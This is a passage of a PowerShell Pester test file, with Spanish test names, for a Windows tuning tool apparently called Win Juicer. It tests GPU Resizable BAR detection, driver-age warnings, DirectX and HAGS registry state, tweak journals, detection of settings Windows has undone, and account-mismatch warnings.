        Test-JuicerHomeAcl (New-TestHomeAcl -UserRights 'Modify') | Should -BeFalse
        Test-JuicerHomeAcl (New-TestHomeAcl -UserRights 'Write') | Should -BeFalse
        Test-JuicerHomeAcl (New-TestHomeAcl -UserRights 'Modify' -UserSid 'S-1-5-11') | Should -BeFalse
    }
}

Describe 'Resizable BAR y drivers antiguos' {
    It 'sólo juzga las gráficas que lo admiten' {
        foreach ($n in 'NVIDIA GeForce RTX 3070', 'NVIDIA GeForce RTX 4090', 'AMD Radeon RX 6700 XT', 'AMD Radeon RX 7900 XTX', 'Intel(R) Arc(TM) A770 Graphics') {
            Test-JuicerRebarCapable (Get-JuicerGpuTraits $n) | Should -BeTrue -Because $n
        }
        foreach ($n in 'NVIDIA GeForce GTX 1080', 'NVIDIA GeForce RTX 2070', 'NVIDIA GeForce GTX 1660 Ti', 'AMD Radeon RX 580', 'AMD Radeon RX 5700 XT', 'AMD Radeon RX Vega 64', 'Intel(R) UHD Graphics 770', 'Microsoft Basic Display Adapter') {
            Test-JuicerRebarCapable (Get-JuicerGpuTraits $n) | Should -BeFalse -Because $n
        }
        Test-JuicerRebarCapable $null | Should -BeFalse
    }

    It 'un driver viejo de una tarjeta en la rama antigua es un dato, no un aviso' {
        foreach ($n in 'NVIDIA GeForce GTX 1060 6GB', 'NVIDIA GeForce GTX 970', 'AMD Radeon RX 580 Series', 'AMD Radeon RX Vega 56') {
            $f = Get-JuicerDriverAgeFinding $n 400
            $f.Severity | Should -Be 'Info' -Because $n
            $f.Title | Should -BeLike '*400 días*'
            $f.Detail | Should -BeLike '*último*'
        }
        # A current card keeps its warning.
        (Get-JuicerDriverAgeFinding 'NVIDIA GeForce RTX 4070' 400).Severity | Should -Be 'Medio'
        (Get-JuicerDriverAgeFinding 'AMD Radeon RX 6800' 400).Severity | Should -Be 'Medio'
        # Not old enough: nothing, legacy or not.
        Get-JuicerDriverAgeFinding 'NVIDIA GeForce GTX 1060' 100 | Should -BeNullOrEmpty
    }
}

Describe 'Optimizaciones de ventana y HAGS' {
    BeforeAll { $script:DxKey = 'HKCU\Software\Microsoft\DirectX\UserGpuPreferences' }
    BeforeEach { $script:M = New-FakeMachine }

    It 'sin la marca en el registro es desconocido, no «desactivadas»' {
        Get-JuicerWindowedState | Should -BeNullOrEmpty
        Write-JuicerReg $script:DxKey 'DirectXUserGlobalSettings' 'String' 'VRROptimizeEnable=0;'
        Get-JuicerWindowedState | Should -BeNullOrEmpty
        Write-JuicerReg $script:DxKey 'DirectXUserGlobalSettings' 'String' 'SwapEffectUpgradeEnable=0;'
        Get-JuicerWindowedState | Should -BeFalse
        Write-JuicerReg $script:DxKey 'DirectXUserGlobalSettings' 'String' 'VRROptimizeEnable=0;SwapEffectUpgradeEnable=1;'
        Get-JuicerWindowedState | Should -BeTrue
    }

    It 'HAGS espera al reinicio según la última vez que se aplicó, no la primera' {
        $boot = [datetime]'2026-06-01T10:00:00'
        Test-JuicerAppliedAfterBoot @{ AppliedAt = '2026-05-01T09:00:00' } $boot | Should -BeFalse
        # Applied first long ago, again after the boot: waits.
        Test-JuicerAppliedAfterBoot @{ AppliedAt = '2026-05-01T09:00:00'; LastAppliedAt = '2026-06-01T11:00:00' } $boot | Should -BeTrue
        # Entries from before LastAppliedAt existed use AppliedAt.
        Test-JuicerAppliedAfterBoot @{ AppliedAt = '2026-06-01T11:00:00' } $boot | Should -BeTrue
        Test-JuicerAppliedAfterBoot $null $boot | Should -BeFalse
        Test-JuicerAppliedAfterBoot @{ AppliedAt = '2026-06-01T11:00:00' } $null | Should -BeFalse
    }

    It 'cada «Aplicado» actualiza LastAppliedAt y AppliedAt no se mueve' {
        Clear-FeatureJournal
        try {
            [void](Invoke-JuicerTweak (Find-JuicerTweak 'juegos.modo'))
            $j = Read-JuicerJournal
            $e = Get-JuicerJournalEntry $j 'juegos.modo'
            $e.LastAppliedAt | Should -Not -BeNullOrEmpty
            $e.AppliedAt = '2020-01-01T00:00:00'
            $e.LastAppliedAt = '2020-01-01T00:00:00'
            Save-JuicerJournal $j
            # Windows puts it back; applying it again moves only LastAppliedAt.
            Write-JuicerReg 'HKCU\Software\Microsoft\GameBar' 'AutoGameModeEnabled' 'DWord' 0
            (Invoke-JuicerTweak (Find-JuicerTweak 'juegos.modo')).Outcome | Should -Be 'Aplicado'
            $e = Get-JuicerJournalEntry (Read-JuicerJournal) 'juegos.modo'
            ([datetime]$e.AppliedAt).Year | Should -Be 2020
            ([datetime]$e.LastAppliedAt) | Should -BeGreaterThan ([datetime]'2025-01-01')
        } finally { Clear-FeatureJournal }
    }
}

Describe 'Lo que Windows ha deshecho, con portátil y estados ya leídos' {
    BeforeEach { Clear-FeatureJournal }
    AfterEach { Clear-FeatureJournal }

    It 'el modo de energía por fuente no cuenta como deshecho con la batería puesta' {
        $overlay = @{ State = 'Pendiente'; Reason = $null; Undoable = $true; Pending = @(@{ Type = 'Custom'; Key = 'overlay'; Label = 'Modo' }) }
        Mock -ModuleName WinJuicer Get-JuicerTweakState { $overlay }.GetNewClosure()
        $journal = [System.Collections.ArrayList]@(@{ Id = 'energia.modo'; Title = 'Modo'; Actions = @() })
        Mock -ModuleName WinJuicer Test-JuicerOnBattery { $true }
        @(Get-JuicerDrift $journal).Count | Should -Be 0
        Mock -ModuleName WinJuicer Test-JuicerOnBattery { $false }
        @(Get-JuicerDrift $journal).Count | Should -Be 1
    }

    It 'usa los estados ya leídos en lugar de leerlos otra vez' {
        Mock -ModuleName WinJuicer Get-JuicerTweakState { throw 'no debería leerse' }
        $journal = [System.Collections.ArrayList]@(@{ Id = 'juegos.modo'; Title = 'Modo juego'; Actions = @() })
        $states = @{ 'juegos.modo' = @{ State = 'Pendiente'; Reason = $null; Undoable = $true; Pending = @(@{ Type = 'Registry' }) } }
        @(Get-JuicerDrift $journal -States $states).Count | Should -Be 1
        Should -Invoke -ModuleName WinJuicer Get-JuicerTweakState -Times 0
    }
}

Describe 'Diario dañado en la ventana, usuario distinto y caché del hardware' {
    BeforeEach { Clear-FeatureJournal }
    AfterEach { Clear-FeatureJournal }

    It 'la lectura segura da una lista vacía y guarda el motivo, sin tirar el diario' {
        [IO.File]::WriteAllText((Get-JuicerJournalPath), '{ esto no es json')
        $j = Read-JuicerJournalSafe
        $j.Count | Should -Be 0
        (& (Get-Module WinJuicer) { $script:JournalReadError }) | Should -BeLike '*dañado*'
        Test-Path -LiteralPath (Get-JuicerJournalPath) | Should -BeTrue
        Save-JuicerJournal @(@{ Id = 'a'; Title = 'A'; Actions = @() })
        (Read-JuicerJournalSafe).Count | Should -Be 1
        (& (Get-Module WinJuicer) { $script:JournalReadError }) | Should -BeNullOrEmpty
    }

    It 'avisa si Win Juicer corre con otra cuenta que la de la sesión, y sólo entonces' {
        Mock -ModuleName WinJuicer Test-JuicerWindows { $true }
        Mock -ModuleName WinJuicer Get-JuicerSessionUser { @{ Domain = 'OTRO'; User = 'persona' } }
        $m = Get-JuicerUserMismatch -Me 'PC\yo'
        $m.Me | Should -Be 'PC\yo'
        $m.Session | Should -Be 'OTRO\persona'
        Get-JuicerUserMismatchText $m | Should -BeLike '*se aplicarán a la cuenta*'
        Mock -ModuleName WinJuicer Get-JuicerSessionUser { @{ Domain = 'PC'; User = 'yo' } }
        Get-JuicerUserMismatch -Me 'PC\yo' | Should -BeNullOrEmpty
        Mock -ModuleName WinJuicer Get-JuicerSessionUser { $null }
        Get-JuicerUserMismatch -Me 'PC\yo' | Should -BeNullOrEmpty
    }

    It 'el perfil de hardware leído una vez se reutiliza sin volver a leerlo' {
        $mod = Get-Module WinJuicer
        try {
            & $mod { $script:HardwareProfile = $null }
            $hw = @{ Cpu = @{ Name = 'CPU de prueba' }; Gpus = @(); Modules = @() }
            Set-JuicerHardwareProfileCache $hw
            (Get-JuicerHardwareProfile).Cpu.Name | Should -Be 'CPU de prueba'
            # A stub with no CPU (the read failed) is not kept.
            & $mod { $script:HardwareProfile = $null }
            Set-JuicerHardwareProfileCache @{ Cpu = @{}; Gpus = @(); Modules = @() }
            (& $mod { $script:HardwareProfile }) | Should -BeNullOrEmpty
        } finally { & $mod { $script:HardwareProfile = $null } }
    }
}
